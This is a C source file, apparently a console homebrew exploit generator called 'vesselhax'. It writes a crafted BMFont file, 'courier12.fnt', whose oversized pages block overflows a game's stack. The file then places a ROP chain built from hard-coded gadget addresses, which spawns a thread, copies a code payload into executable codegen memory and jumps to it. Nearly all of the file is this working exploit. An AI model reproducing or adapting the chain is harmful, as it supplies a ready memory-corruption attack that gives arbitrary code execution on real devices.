#include "stream.h"
#include <stdio.h>
#include <stdint.h>
#include <malloc.h>
#include <sys/types.h>

#define ROP_POP_R3R4 0x0110C904
#define ROP_POPJUMPLR_STACK12 0x0101CD24
#define ROP_POPJUMPLR_STACK20 0x01024D88
#define ROP_CALLFUNC 0x01080274
#define ROP_CALLR28_POP_R28_TO_R31 0x0107DD70
#define ROP_POP_R28R29R30R31 0x0101D8D4
#define ROP_POP_R27 0x0101CB00
#define ROP_POP_R24_TO_R31 0x010204C8
#define ROP_CALLFUNCPTR_WITHARGS_FROM_R3MEM 0x010253C0
#define ROP_SETR3TOR31_POP_R31 0x0101CC10

#define ROP_Register 0x010277B8
#define ROP_CopyToSaveArea 0x010277DC
#define ROP_memcpy 0x01035FC8
#define ROP_DCFlushRange 0x01023F88
#define ROP_ICInvalidateRange 0x010240B0
#define ROP_OSSwitchSecCodeGenMode 0x010376C0
#define ROP_OSCodegenCopy 0x010376D8
#define ROP_OSGetCodegenVirtAddrRange 0x010375C0
#define ROP_OSGetCoreId 0x01024E8C
#define ROP_OSResumeThread 0x01042108
#define ROP_OSCreateThread 0x01041b64
#define ROP_OSGetCurrentThread 0x01043150
#define ROP_OSSetThreadAffinity 0x010429DC
#define ROP_OSYieldThread 0x010418E4
#define ROP_OSFatal 0x01031618
#define ROP_Exit 0x0101CD80
#define ROP_OSScreenFlipBuffersEx 0x0103AFD0
#define ROP_OSScreenClearBufferEx 0x0103B090
#define ROP_OSDynLoad_Acquire 0x0102A3B4
#define ROP_OSDynLoad_FindExport 0x0102B828
#define ROP_os_snprintf 0x0102F160
#define ROP_GX2Init 0x01156B78
#define ROP_GX2Flush 0x011575AC
#define ROP_GX2WaitForVsync 0x01151964
#define ROP_GX2DirectCallDisplayList 0x01152BF0
#define ROP_GXCallDisplayList 0x01152B3C

#define ROP_DCStoreRange 0x02007BC4 - 0xFE3C00
#define ROP_IOS_Open 0x0203246C - 0xFE3C00
#define ROP_Restart 0x02019A80 - 0xFE3C00
#define ROP_OSDriver_Register 0x010277B8
#define ROP_OSDriver_Deregister 0x010277C4
#define ROP_OSDriver_CopyFromSaveArea 0x010277D0
#define ROP_OSDriver_CopyToSaveArea 0x010277DC
#define ROP_OSBlockMove 0x02019EE4 - 0xFE3C00
#define ROP_OSExitThread 0x01041d6c
#define ROP_memset 0x02019BB4 - 0xFE3C00
#define ROP_memclr 0x02019BBC - 0xFE3C00
#define ROP_OSSendAppSwitchRequest 0x0201D830 - 0xFE3C00
#define ROP_Syscall_0x01 0x02014A5C - 0xFE3C00

#define ROP_VESSEL_TEXT_OFFSET 0x00800000
#define ROP_VESSEL_DATA_OFFSET 0x00502200

#define ROP_VESSEL_STACK_PTR 0x1768be98
#define ROP_VESSEL_BMF_FILE_PTR 0x38a86c40
#define ROP_VESSEL_COPY_TO_CODEGEN 0x020600B0 + ROP_VESSEL_TEXT_OFFSET

#define _S(x) endianSwap((uint32_t)x)
#define BMFONT_HEADER_VER_3 (uint32_t)0x424d4603 // BMF\x03

/*
	def tiny_call(self, fptr, r3=0, r4=0):
		self.pop_r3r4(r3, r4)
		self.rop_payload.append(ROP_POP_R28R29R30R31)
		self.rop_payload.append(fptr)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(r4)
		self.rop_payload.append(0)
		self.rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
*/

void rop_tiny_call(DataStream* st, uint32_t fptr, uint32_t r3, uint32_t r4) {

	st->Write_U32(_S(ROP_POP_R3R4));
	st->Write_U32(_S(r3));
	st->Write_U32(_S(r4));
	st->Write_U32(0);

	st->Write_U32(_S(ROP_POP_R28R29R30R31));
	st->Write_U32(_S(fptr));
	st->Write_U32(0);
	st->Write_U32(0);
	st->Write_U32(_S(r4));
	st->Write_U32(0);

	st->Write_U32(_S(ROP_CALLR28_POP_R28_TO_R31));
	st->Write_U32(0);
	st->Write_U32(0);
	st->Write_U32(0);
	st->Write_U32(0);
	st->Write_U32(0);

}

void rop_pop_r24_to_r31(DataStream* st, uint32_t* input_regs) {

	st->Write_U32(_S(ROP_POP_R24_TO_R31));
	st->Write_U32(0);
	st->Write_U32(0);

	for(int i = 0; i < 8; i++) {
		st->Write_U32(_S(input_regs[i]));
	}

	st->Write_U32(0);

}

void rop_call_func(DataStream* st, uint32_t fptr, uint32_t r3, uint32_t r4, uint32_t r5, uint32_t r6, uint32_t r28) {

	uint32_t input_regs[8] = {r6, r5, 0, ROP_CALLR28_POP_R28_TO_R31, fptr, r3, 0, r4};

	rop_pop_r24_to_r31(st, input_regs);

	st->Write_U32(_S(ROP_CALLFUNC));
	st->Write_U32(_S(r28));

	st->Write_U32(0xDEA110FF);
	st->Write_U32(0xDEA111FF);
	st->Write_U32(0xDEA112FF);
	st->Write_U32(0xDEA113FF);

}

void rop_switch_to_core1(DataStream* st) {

	rop_call_func(st, ROP_OSGetCurrentThread, 0, 2 /* core1 */, 0, 0, ROP_OSSetThreadAffinity);

	st->Write_U32(_S(ROP_CALLR28_POP_R28_TO_R31));
	st->Write_U32(_S(ROP_OSYieldThread));
	st->Write_U32(0);
	st->Write_U32(0);
	st->Write_U32(0);
	st->Write_U32(0);

	st->Write_U32(_S(ROP_CALLR28_POP_R28_TO_R31));
	st->Write_U32(0);
	st->Write_U32(0);
	st->Write_U32(0);
	st->Write_U32(0);
	st->Write_U32(0);

}

void rop_write32(DataStream* st, uint32_t addr, uint32_t value) {

	st->Write_U32(_S(ROP_POP_R3R4));
	st->Write_U32(_S(value));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0));

	st->Write_U32(_S(ROP_POP_R28R29R30R31));
	st->Write_U32(_S(ROP_OSGetCodegenVirtAddrRange + 0x20));
	st->Write_U32(_S(0));
	st->Write_U32(_S(addr));
	st->Write_U32(_S(0x10000000));
	st->Write_U32(_S(0));
	st->Write_U32(_S(ROP_CALLR28_POP_R28_TO_R31));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0));

}

void rop_OSCreateThread(DataStream* st, uint32_t thread, uint32_t entry, uint32_t argc, uint32_t argv, uint32_t stack, uint32_t stackSize, uint32_t prio, uint32_t attr) {

	uint32_t inputregs[8];
	inputregs[24 - 24] = 0;
	inputregs[25 - 24] = stack;
	inputregs[26 - 24] = stackSize;
	inputregs[27 - 24] = prio;
	inputregs[28 - 24] = thread;
	inputregs[29 - 24] = entry;
	inputregs[30 - 24] = argc;
	inputregs[31 - 24] = argv;	

	rop_pop_r24_to_r31(st, inputregs);

	st->Write_U32(_S(ROP_OSCreateThread + 0x44));
	st->Write_U32(_S(2));
	st->Write_U32(_S(attr << 16));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0));
	st->Write_U32(_S(0)); 

}

int main(int argc, char** argv) {
	
	FILE* f = fopen("courier12.fnt", "wb+");

	DataStream* st = new DataStream(0x4800, false);
	st->Write_U32(endianSwap(BMFONT_HEADER_VER_3));

	/* Write block type 1 : info */
	st->Write_U8(1);
	st->Write_U32(26); // block size
	st->Write_U16(0xFFF4); // fontSize
	st->Write_U8(0x40); // bitfield
	st->Write_U8(0); // charSet
	st->Write_U16(0x64); // stretchH
	st->Write_U8(1); // aa
	st->Write_U8(0); // paddingUp
	st->Write_U8(0); // paddingRight
	st->Write_U8(0); // paddingDown
	st->Write_U8(0); // paddingLeft
	st->Write_U8(0); // spacingHoriz
	st->Write_U8(0); // spacingVert
	st->Write_U8(0); // outline
	memcpy(st->data + st->offset, "Courier New", 12); st->offset += 12;

	/* Write block type 2 : common */
	st->Write_U8(2);
	st->Write_U32(15); // block size
	st->Write_U16(15); // lineHeight
	st->Write_U16(12); // base
	st->Write_U16(0x100); // scaleW
	st->Write_U16(0x100); // scaleH
	st->Write_U16(1); // number of page blocks (has to be 1 -> 0x02092E6C)
	st->Write_U8(0); // bitfield
	st->Write_U8(0); // alphaChnl
	st->Write_U8(0); // redChnl
	st->Write_U8(0); // greenChnl
	st->Write_U8(0); // blueChnl

	/* Write fake block type 3 : pages */
	st->Write_U8(3);
	st->Write_U32(st->max_off - st->offset - 4); // big size, stack overflow
	memset(st->data + st->offset, 0x41, st->max_off - st->offset - 1);
	st->data[st->offset + 0x1f] = 0; // cut the string early, so FSOpenFile doesn't freak out and crash

	uint32_t* data = (uint32_t*)(st->data + st->offset + 0x20);
	st->offset += 0x114 + 0x20;

	data[0x0D0/4] = _S(0xDEA1D0FF);
	data[0x0D4/4] = _S(0xDEA1D1FF);
	data[0x0D8/4] = _S(0xDEA1D2FF);
	data[0x0DC/4] = _S(0xDEA1D3FF);
	data[0x0E0/4] = _S(0xDEA1D4FF);
	data[0x0E4/4] = _S(0xDEA101FF); // r21
	data[0x0E8/4] = _S(0xDEA102FF); // r22
	data[0x0EC/4] = _S(0xDEA103FF); // r23
	data[0x0F0/4] = _S(0xDEA104FF); // r24
	data[0x0F4/4] = _S(0xDEA105FF); // r25
	data[0x0F8/4] = _S(0xDEA106FF); // r26
	data[0x0FC/4] = _S(0xDEA107FF); // r27
	data[0x100/4] = _S(0xDEA108FF); // r28
	data[0x104/4] = _S(0xDEA109FF); // r29
	data[0x108/4] = _S(0xDEA10AFF); // r30
	data[0x10C/4] = _S(0xDEA10BFF); // r31
	data[0x110/4] = _S(0x00000000); 

	rop_call_func(st, ROP_memcpy, ROP_VESSEL_STACK_PTR + 40, ROP_VESSEL_BMF_FILE_PTR+ st->max_off + 4, 0x8000, 0, 0);

	/* Open the code to be run */
	FILE *code = fopen("vesselhax_code.bin", "rb");
	if(!code) {
		printf("Please compile vesselhax_code or provide the 'vesselhax_code.bin' in the same directory as the executable\n");
		exit(0);
	}

	fseek(code, 0, SEEK_END);
	size_t sz = ftell(code);
	fseek(code, 0, SEEK_SET);
	uint8_t* code_data = (uint8_t*)malloc(sz);
	fread(code_data, 1, sz, code);
	fclose(code);

	st->offset = st->max_off + 4;
	st->Expand(0x400 + sz);
	st->Write_U32(0x41414141);
	st->Write_U32(0x42424242);
	st->Write_U32(0x43434343);
	st->Write_U32(0x44444444);
	st->Write_U32(0x45454545);
	st->Write_U32(0x46464646);
	st->Write_U32(0x47474747);
	st->Write_U32(0x48484848);
	st->Write_U32(0x49494949);
	st->Write_U32(0x51414141);
	st->Write_U32(0x52424242);

	/* Since we're running on a default thread, we cannot change the affinity */
	/* So, just create a new thread on core 1*/

	rop_OSCreateThread(st, 0x40066000, ROP_POP_R24_TO_R31, 0, 0, 0x40070000, 0x10000, 0, 2 | 8);
	rop_call_func(st, ROP_memcpy, 0x40070000  + 0x14, ROP_VESSEL_BMF_FILE_PTR + st->offset + 0x48 + 0x40 + 4, 0x400, 0, 0);
	rop_tiny_call(st, ROP_OSResumeThread, 0x40066000, 0);
	st->Write_U32(_S(ROP_OSExitThread)); // Exit the default thread, our code should now be running on a new thread

	rop_call_func(st, ROP_VESSEL_COPY_TO_CODEGEN, 0x01800000, ROP_VESSEL_BMF_FILE_PTR + st->offset + 0x48 + 4, sz, 0, 0);
	st->Write_U32(_S(0x01800000)); // jump to vesselhax_code.bin
	memcpy(st->data + st->offset, code_data, sz);

	fwrite(st->data, 1, st->max_off, f);
	fclose(f);

	printf("Done.\n");

	return 0;
}